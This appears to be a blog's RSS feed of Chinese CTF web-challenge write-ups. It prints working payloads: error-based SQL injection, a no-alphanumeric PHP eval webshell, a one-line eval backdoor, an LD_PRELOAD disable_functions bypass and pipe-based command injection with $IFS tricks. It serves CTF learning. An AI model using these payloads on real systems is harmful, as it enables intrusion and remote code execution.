<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web on </title>
    <link>/tags/web/</link>
    <description>Recent content in Web on </description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate>
    <atom:link href="/tags/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CISCN线上赛库存</title>
      <link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
      <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
      <guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
      <description>easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合&#xA;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&#xA;过滤的字符有union，所以尝试报错注入，查询版本号。&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&#xA;最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&#xA;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</description>
    </item>
    <item>
      <title>BUUCTF寒假刷题-Web</title>
      <link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link>
      <pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate>
      <guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid>
      <description>寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&#xA;2021.01.15 [HCTF 2018]WarmUp 进到靶机一个硕大的滑稽，查看源码有提示source.php&#xA;&amp;lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;amp;$page) { $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;]; if (! isset($page) || !is_string($page)) { echo &amp;#34;you can&amp;#39;t see it&amp;#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?</description>
    </item>
    <item>
      <title>极客大挑战 2019 RCE ME</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
      <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
      <description>[极客大挑战 2019]RCE ME 源码：&#xA;&amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;code&amp;#39;])){ $code=$_GET[&amp;#39;code&amp;#39;]; if(strlen($code)&amp;gt;40){ die(&amp;#34;This is too Long.&amp;#34;); } if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){ die(&amp;#34;NO.&amp;#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&amp;gt; 分析一波，GET请求获得code，想要通过的话需要绕过两个检测：&#xA;payload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。&#xA;使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’]))&#xA;先构造assert：&#xA;echo urlencode(~&amp;#39;assert&amp;#39;); //结果：%9E%8C%8C%9A%8D%8B 再构造eval($_POST[&#39;a&#39;])：&#xA;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6 完整payload：&#xA;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6); 网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。&#xA;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127：&#xA;搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看：&#xA;因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法：&#xA;利用环境变量LD_PRELOAD来绕过&#xA;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&#xA;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&#xA;正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&#xA;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&#xA;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&#xA;上传一句话木马233.php：&#xA;&amp;lt;?php @eval($_POST[&amp;#39;b&amp;#39;]); 再用一句话木马的shell执行插件：&#xA;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&#xA;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&#xA;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</description>
    </item>
    <item>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link>/posts/ctf/gxyctf2019ping-ping-ping/</link>
      <pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate>
      <guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid>
      <description>[GXYCTF2019]Ping Ping Ping 题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&#xA;和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用：&#xA;?ip=127.0.0.1|ls 目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格：&#xA;$IFS&#xD;${IFS}&#xD;$IFS$1 //$1改成$加其他数字貌似都行&#xD;&amp;lt; &amp;lt;&amp;gt; {cat,flag.php} //用逗号实现了空格功能&#xD;%20 %09 在linux下反单引号里面的指令会被执行 `ls`&#xA;?ip=|cat$IFS`ls` 会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤：&#xA;/?ip=|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match)){ echo preg_match(&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match); die(&amp;#34;fxck your symbol!&amp;#34;); } else if(preg_match(&amp;#34;/ /&amp;#34;, $ip)){ die(&amp;#34;fxck your space!&amp;#34;); } else if(preg_match(&amp;#34;/bash/&amp;#34;, $ip)){ die(&amp;#34;fxck your bash!&amp;#34;); } else if(preg_match(&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;, $ip)){ die(&amp;#34;fxck your flag!&amp;#34;); } $a = shell_exec(&amp;#34;ping -c 4 &amp;#34;.$ip); echo &amp;#34; &amp;#34;; print_r($a); } ?&amp;gt; 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行：&#xA;?ip=|cat$IFS`ls` 这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。&#xA;最后记录下学到的姿势和这道题目的其他思路：</description>
    </item>
    <item>
      <title>DMCTF之Web</title>
      <link>/posts/ctf/dmctf%E4%B9%8Bweb/</link>
      <pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate>
      <guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid>
      <description>前言 比赛地址：http://dmctf.vaala.cloud:81&#xA;这次先写Web题目部分，我最后的排名：&#xA;Web weak_type 源码：&#xA;PHP&#xD;&amp;lt;?php&#xD;show_source(__FILE__);&#xD;include(&amp;#39;class.php&amp;#39;);&#xD;//level1 if(isset($_GET[&amp;#39;num&amp;#39;])){&#xD;$num = $_GET[&amp;#39;num&amp;#39;];&#xD;if($num===&amp;#34;202020020&amp;#34;){&#xD;die(&amp;#34;no no no!&amp;#34;);&#xD;}&#xD;if(intval($num,0)===202020020){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;what are you doing?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 2&#xD;if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){&#xD;$v1 = $_GET[&amp;#39;v1&amp;#39;];&#xD;$v2 = $_GET[&amp;#39;v2&amp;#39;];&#xD;if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;Are you kidding me ?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 3 if (isset($_POST[&amp;#39;message&amp;#39;])) {&#xD;$message = json_decode($_POST[&amp;#39;message&amp;#39;]);&#xD;if ($message-&amp;gt;key == $key) {&#xD;echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !</description>
    </item>
    <item>
      <title>Hackgame2020(一)</title>
      <link>/posts/ctf/hackgame20201/</link>
      <pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate>
      <guid>/posts/ctf/hackgame20201/</guid>
      <description>前言 比赛地址：https://hack.lug.ustc.edu.cn/&#xA;web 签到题 ​&#x9;第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。&#xA;​&#x9;随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数&#xA;​&#x9;我猜的题目可能是想让数值为1时能提取到flag。&#xA;​&#x9;F12查看源代码，定位到进度条的标签，查看属性&#xA;​&#x9;确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。&#xA;2048 ​&#x9;打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！&#xA;F12开始翻网页资源&#xA;​&#x9;还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。&#xA;​&#x9;打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&#xA;发现了&#xA;​&#x9;只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。&#xA;general 猫咪问题++ ​&#x9;秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&#xA;​&#x9;题意思很明显的书考验同学的搜题技巧。那就开工。&#xA;第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&#xA;提示：学术上一般认为龙不属于哺乳动物。&#xA;​&#x9;本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。&#xA;​&#x9;一个比较有印象就是FreeDOS这个标志就离谱，什么玩意&#xA;参考答案 ：12&#xA;第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​&#x9;卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。&#xA;参考答案：256&#xA;第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？</description>
    </item>
  </channel>
</rss>
